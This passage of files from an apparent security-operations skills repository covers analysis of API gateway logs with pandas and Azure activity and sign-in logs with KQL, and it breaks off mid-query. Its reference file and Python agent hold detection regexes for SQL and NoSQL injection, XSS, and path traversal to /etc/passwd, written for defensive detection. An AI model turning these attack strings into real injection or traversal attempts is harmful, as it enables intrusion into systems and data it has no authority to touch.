

===== FILE: skills/analyzing-api-gateway-access-logs/SKILL.md =====
---
name: analyzing-api-gateway-access-logs
description: 'Parses API Gateway access logs (AWS API Gateway, Kong, Nginx) to detect
  BOLA/IDOR attacks, rate limit bypass, credential scanning, and injection attempts.
  Uses pandas for statistical analysis of request patterns and anomaly detection.
  Use when investigating API abuse or building API-specific threat detection rules.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- api-security
- access-log-analysis
- aws-api-gateway
- kong
- nginx
- bola-detection
- rate-limit-bypass
- security-operations
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1190
- T1110.004
- T1078.004
- T1119
---

# Analyzing API Gateway Access Logs


## When to Use

- When investigating security incidents that require analyzing api gateway access logs
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Parse API gateway access logs to identify attack patterns including broken object
level authorization (BOLA), excessive data exposure, and injection attempts.

```python
import pandas as pd

df = pd.read_json("api_gateway_logs.json", lines=True)
# Detect BOLA: same user accessing many different resource IDs
bola = df.groupby(["user_id", "endpoint"]).agg(
    unique_ids=("resource_id", "nunique")).reset_index()
suspicious = bola[bola["unique_ids"] > 50]
```

Key detection patterns:
1. BOLA/IDOR: sequential resource ID enumeration
2. Rate limit bypass via header manipulation
3. Credential scanning (401 surges from single source)
4. SQL/NoSQL injection in query parameters
5. Unusual HTTP methods (DELETE, PATCH) on read-only endpoints

## Examples

```python
# Detect 401 surges indicating credential scanning
auth_failures = df[df["status_code"] == 401]
scanner_ips = auth_failures.groupby("source_ip").size()
scanners = scanner_ips[scanner_ips > 100]
```

===== END FILE =====


===== FILE: skills/analyzing-api-gateway-access-logs/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/analyzing-api-gateway-access-logs/references/api-reference.md =====
# API Reference: Analyzing API Gateway Access Logs

## AWS API Gateway Log Fields

```json
{
  "requestId": "abc-123",
  "ip": "203.0.113.50",
  "httpMethod": "GET",
  "resourcePath": "/api/users/{id}",
  "status": 200,
  "requestTime": "2025-03-15T14:00:00Z",
  "responseLength": 1024
}
```

## Pandas Log Analysis

```python
import pandas as pd

df = pd.read_json("access_logs.json", lines=True)

# BOLA detection
df.groupby("user_id")["resource_id"].nunique()

# Auth failure surge
df[df["status_code"] == 401].groupby("source_ip").size()

# Request velocity
df.set_index("timestamp").resample("1min").size()
```

## OWASP API Top 10 Patterns

| Risk | Detection Pattern |
|------|-------------------|
| BOLA (API1) | User accessing > 50 unique resource IDs |
| Broken Auth (API2) | > 100 401/403 from single IP |
| Excessive Data (API3) | Response size > 10x average |
| Rate Limit (API4) | > 100 req/min from single IP |
| BFLA (API5) | DELETE/PUT on read-only endpoints |
| Injection (API8) | SQL/NoSQL patterns in params |

## Injection Regex Patterns

```python
sql = r"union\s+select|drop\s+table|'\s*or\s+'1'"
nosql = r"\$ne|\$gt|\$regex|\$where"
xss = r"<script|javascript:|onerror="
path_traversal = r"\.\./\.\./|/etc/passwd"
```

### References

- OWASP API Security Top 10: https://owasp.org/API-Security/
- AWS API Gateway logging: https://docs.aws.amazon.com/apigateway/latest/developerguide/
- pandas: https://pandas.pydata.org/docs/

===== END FILE =====


===== FILE: skills/analyzing-api-gateway-access-logs/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for analyzing API Gateway access logs for security threats."""

import re
import json
import argparse
from datetime import datetime

import pandas as pd


def load_api_logs(log_path):
    """Load API gateway logs from JSON lines or CSV."""
    if log_path.endswith(".csv"):
        return pd.read_csv(log_path, parse_dates=["timestamp"])
    return pd.read_json(log_path, lines=True)


def detect_bola_attacks(df, threshold=50):
    """Detect Broken Object Level Authorization (BOLA/IDOR) attacks."""
    findings = []
    if "resource_id" not in df.columns:
        path_col = "request_path" if "request_path" in df.columns else "path"
        df["resource_id"] = df[path_col].str.extract(r'/(\d+)(?:/|$|\?)')
    df_with_ids = df.dropna(subset=["resource_id"])
    if df_with_ids.empty:
        return findings
    user_col = "user_id" if "user_id" in df.columns else "source_ip"
    grouped = df_with_ids.groupby([user_col]).agg(
        unique_resources=("resource_id", "nunique"),
        total_requests=("resource_id", "count"),
    ).reset_index()
    bola_suspects = grouped[grouped["unique_resources"] >= threshold]
    for _, row in bola_suspects.iterrows():
        findings.append({
            "user": row[user_col],
            "unique_resources_accessed": int(row["unique_resources"]),
            "total_requests": int(row["total_requests"]),
            "type": "BOLA/IDOR",
            "severity": "CRITICAL",
        })
    return findings


def detect_auth_scanning(df, threshold=100):
    """Detect credential scanning via 401/403 response surges."""
    findings = []
    auth_failures = df[df["status_code"].isin([401, 403])]
    if auth_failures.empty:
        return findings
    ip_col = "source_ip" if "source_ip" in df.columns else "client_ip"
    ip_failures = auth_failures.groupby(ip_col).agg(
        failure_count=("status_code", "count"),
        unique_endpoints=("request_path", "nunique") if "request_path" in df.columns
        else ("path", "nunique"),
    ).reset_index()
    scanners = ip_failures[ip_failures["failure_count"] >= threshold]
    for _, row in scanners.iterrows():
        findings.append({
            "source_ip": row[ip_col],
            "auth_failures": int(row["failure_count"]),
            "endpoints_probed": int(row["unique_endpoints"]),
            "type": "credential_scanning",
            "severity": "HIGH",
        })
    return findings


def detect_injection_attempts(df):
    """Detect SQL/NoSQL injection attempts in request parameters."""
    injection_patterns = [
        r"(?:union\s+select|select\s+.*\s+from|drop\s+table|insert\s+into)",
        r"(?:'\s*or\s+'1'\s*=\s*'1|'\s*or\s+1\s*=\s*1)",
        r'(?:\$ne|\$gt|\$lt|\$regex|\$where)',
        r'(?:<script|javascript:|onerror=|onload=)',
        r'(?:\.\./\.\./|/etc/passwd|/proc/self)',
    ]
    findings = []
    path_col = "request_path" if "request_path" in df.columns else "path"
    query_col = "query_string" if "query_string" in df.columns else path_col
    for _, row in df.iterrows():
        request_str = str(row.get(query_col, "")) + str(row.get("request_body", ""))
        for pattern in injection_patterns:
            if re.search(pattern, request_str, re.IGNORECASE):
                findings.append({
                    "source_ip": row.get("source_ip", row.get("client_ip", "")),
                    "path": row.get(path_col, ""),
                    "pattern_matched": pattern,
                    "type": "injection_attempt",
                    "severity": "HIGH",
                })
                break
    return findings[:500]


def detect_rate_limit_bypass(df, window="1min", threshold=100):
    """Detect rate limit bypass attempts."""
    findings = []
    ip_col = "source_ip" if "source_ip" in df.columns else "client_ip"
    df_copy = df.copy()
    df_copy["timestamp"] = pd.to_datetime(df_copy["timestamp"])
    df_copy = df_copy.set_index("timestamp")
    for ip, group in df_copy.groupby(ip_col):
        resampled = group.resample(window).size()
        bursts = resampled[resampled > threshold]
        if len(bursts) > 0:
            findings.append({
                "source_ip": ip,
                "max_requests_per_min": int(resampled.max()),
                "burst_periods": len(bursts),
                "type": "rate_limit_bypass",
                "severity": "MEDIUM",
            })
    return sorted(findings, key=lambda x: x["max_requests_per_min"], reverse=True)[:50]


def detect_unusual_methods(df):
    """Detect unusual HTTP methods on typically read-only endpoints."""
    findings = []
    dangerous_methods = {"DELETE", "PUT", "PATCH"}
    method_col = "method" if "method" in df.columns else "http_method"
    path_col = "request_path" if "request_path" in df.columns else "path"
    unusual = df[df[method_col].str.upper().isin(dangerous_methods)]
    for _, row in unusual.iterrows():
        findings.append({
            "source_ip": row.get("source_ip", row.get("client_ip", "")),
            "method": row[method_col],
            "path": row[path_col],
            "status_code": int(row.get("status_code", 0)),
            "type": "unusual_method",
            "severity": "MEDIUM",
        })
    return findings[:200]


def main():
    parser = argparse.ArgumentParser(description="API Gateway Log Analysis Agent")
    parser.add_argument("--log-file", required=True, help="API gateway log file")
    parser.add_argument("--output", default="api_gateway_report.json")
    parser.add_argument("--action", choices=[
        "bola", "auth_scan", "injection", "rate_limit", "full_analysis"
    ], default="full_analysis")
    args = parser.parse_args()

    df = load_api_logs(args.log_file)
    report = {"generated_at": datetime.utcnow().isoformat(), "total_requests": len(df),
              "findings": {}}
    print(f"[+] Loaded {len(df)} API requests")

    if args.action in ("bola", "full_analysis"):
        findings = detect_bola_attacks(df)
        report["findings"]["bola"] = findings
        print(f"[+] BOLA suspects: {len(findings)}")

    if args.action in ("auth_scan", "full_analysis"):
        findings = detect_auth_scanning(df)
        report["findings"]["auth_scanning"] = findings
        print(f"[+] Auth scanners: {len(findings)}")

    if args.action in ("injection", "full_analysis"):
        findings = detect_injection_attempts(df)
        report["findings"]["injection_attempts"] = findings
        print(f"[+] Injection attempts: {len(findings)}")

    if args.action in ("rate_limit", "full_analysis"):
        findings = detect_rate_limit_bypass(df)
        report["findings"]["rate_limit_bypass"] = findings
        print(f"[+] Rate limit bypasses: {len(findings)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/analyzing-azure-activity-logs-for-threats/SKILL.md =====
---
name: analyzing-azure-activity-logs-for-threats
description: 'Queries Azure Monitor activity logs and sign-in logs via azure-monitor-query
  to detect suspicious administrative operations, impossible travel, privilege escalation,
  and resource modifications. Builds KQL queries for threat hunting in Azure environments.
  Use when investigating suspicious Azure tenant activity or building cloud SIEM detections.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- azure
- cloud-security
- azure-monitor
- kql
- threat-hunting
- activity-logs
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078.004
- T1098.003
- T1538
- T1556.009
- T1580
---

# Analyzing Azure Activity Logs for Threats


## When to Use

- When investigating security incidents that require analyzing azure activity logs for threats
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Use azure-monitor-query to execute KQL queries against Azure Log Analytics workspaces,
detecting suspicious admin operations and sign-in anomalies.

```python
from azure.identity import DefaultAzureCredential
from azure.monitor.query import LogsQueryClient
from datetime import timedelta

credential = DefaultAzureCredential()
client = LogsQueryClient(credential)

response = client.query_workspace(
    workspace_id="WORKSPACE_ID",
    query="AzureActivity | where OperationNameValue has 'MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE' | take 10",
    timespan=timedelta(hours=24),
)
```

Key detection queries:
1. Role assignment changes (privilege escalation)
2. Resource group and subscription modifications
3. Key vault secret access from new IPs
4. Network security group rule changes
5. Conditional access policy modifications

## Examples

```python
# Detect new Global Admin role assignments
query = '''
AuditLogs
| where OperationName == "Add member to role"
| where TargetResources[0].modifiedProperties[0].newValue has "Global Administrator"
'''
```

===== END FILE =====


===== FILE: skills/analyzing-azure-activity-logs-for-threats/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/analyzing-azure-activity-logs-for-threats/references/api-reference.md =====
# API Reference: Analyzing Azure Activity Logs for Threats

## azure-monitor-query

```python
from azure.identity import DefaultAzureCredential
from azure.monitor.query import LogsQueryClient, LogsQueryStatus
from datetime import timedelta

credential = DefaultAzureCredential()
client = LogsQueryClient(credential)

response = client.query_workspace(
    workspace_id="WORKSPACE_ID",
    query="AzureActivity | take 10",
    timespan=timedelta(hours=24),
)
if response.status == LogsQueryStatus.SUCCESS:
    for table in response.tables:
        columns = [col.name for col in table.columns]
        for row in table.rows:
            print(dict(zip(columns, row)))
```

## Key Azure Log Tables

| Table | Content |
|-------|---------|
| `AzureActivity` | Control plane operations (ARM) |
| `SigninLogs` | Azure AD sign-in events |
| `AuditLogs` | Azure AD audit trail |
| `AzureDiagnostics` | Resource diagnostics (Key Vault, NSG) |
| `SecurityAlert` | Defender for Cloud alerts |

## Threat Detection KQL Patterns

```kql
// Privilege escalation
AzureActivity | where OperationNameValue has "ROLEASSIGNMENTS/WRITE"

// Impossible travel
SigninLogs | where ResultType == 0
| extend Distance = geo_distance_2points(...)

// Mass deletion
AzureActivity | where OperationNameValue endswith "/DELETE"
| summarize count() by Caller, bin(TimeGenerated, 1h)
```

### References

- azure-monitor-query: https://pypi.org/project/azure-monitor-query/
- KQL reference: https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/
- Azure Activity Log schema: https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log-schema

===== END FILE =====


===== FILE: skills/analyzing-azure-activity-logs-for-threats/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for analyzing Azure activity logs for threat detection."""

import os
import json
import argparse
from datetime import datetime, timedelta

from azure.identity import DefaultAzureCredential, ClientSecretCredential
from azure.monitor.query import LogsQueryClient, LogsQueryStatus


def get_credential(tenant_id=None, client_id=None, client_secret=None):
    """Get Azure credential."""
    if client_id and client_secret and tenant_id:
        return ClientSecretCredential(tenant_id, client_id, client_secret)
    return DefaultAzureCredential()


def run_kql(credential, workspace_id, query, hours=24):
    """Execute KQL query against Log Analytics workspace."""
    client = LogsQueryClient(credential)
    response = client.query_workspace(
        workspace_id, query, timespan=timedelta(hours=hours)
    )
    rows = []
    if response.status == LogsQueryStatus.SUCCESS:
        for table in response.tables:
            columns = [col.name for col in table.columns]
            for row in table.rows:
                rows.append(dict(zip(columns, row)))
    return rows


def detect_privilege_escalation(credential, workspace_id):
    """Detect role assignment changes indicating privilege escalation."""
    query = """
    AzureActivity
    | where OperationNameValue has_any (
        "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE",
        "MICROSOFT.AUTHORIZATION/ROLEDEFINITIONS/WRITE"
    )
    | where ActivityStatusValue == "Success"
    | project TimeGenerated, Caller, CallerIpAddress,
              OperationNameValue, ResourceGroup, Properties_d
    | order by TimeGenerated desc
    """
    return run_kql(credential, workspace_id, query)


def detect_nsg_changes(credential, workspace_id):
    """Detect Network Security Group rule modifications."""
    query = """
    AzureActivity
    | where OperationNameValue has_any (
        "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE",
        "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/DELETE"
    )
    | where ActivityStatusValue == "Success"
    | project TimeGenerated, Caller, CallerIpAddress,
              OperationNameValue, ResourceGroup
    | order by TimeGenerated desc
    """
    return run_kql(credential, workspace_id, query)


def detect_keyvault_access(credential, workspace_id):
    """Detect Key Vault secret access from unusual sources."""
    query = """
    AzureDiagnostics
    | where ResourceProvider == "MICROSOFT.KEYVAULT"
    | where OperationName in ("SecretGet", "SecretList", "SecretSet")
    | summarize AccessCount = count(), DistinctIPs = dcount(CallerIPAddress),
                IPList = make_set(CallerIPAddress, 10)
                by identity_claim_upn_s, OperationName, Resource
    | where DistinctIPs > 2 or AccessCount > 50
    | order by AccessCount desc
    """
    return run_kql(credential, workspace_id, query)


def detect_impossible_travel(credential, workspace_id):
    """Detect sign-ins from geographically distant locations in short time."""
    query = """
    SigninLogs
    | where ResultType == 0
    | project TimeGenerated, UserPrincipalName, IPAddress,
              Lat = toreal(LocationDetails.geoCoordinates.latitude),
              Lon = toreal(LocationDetails.geoCoordinates.longitude)
    | sort by UserPrincipalName asc, TimeGenerated asc
    | extend PrevLat = prev(Lat), PrevLon = prev(Lon),
             PrevTime = prev(TimeGenerated), PrevUser = prev(UserPrincipalName)
    | where UserPrincipalName == PrevUser
    | extend TimeDiffMin = datetime_diff('minute', TimeGenerated, PrevTime)
    | where TimeDiffMin < 60 and TimeDiffMin > 0
    | extend DistKm = geo_distance_2points(Lon, Lat, PrevLon, PrevLat) / 1000
    | where DistKm > 500
    | project TimeGenerated, UserPrincipalName, IPAddress, DistKm, TimeDiffMin
    """
    return run_kql(credential, workspace_id, query)


def detect_resource_deletion(credential, workspace_id):
    """Detect mass resource deletion events."""
    query = """
    AzureActivity
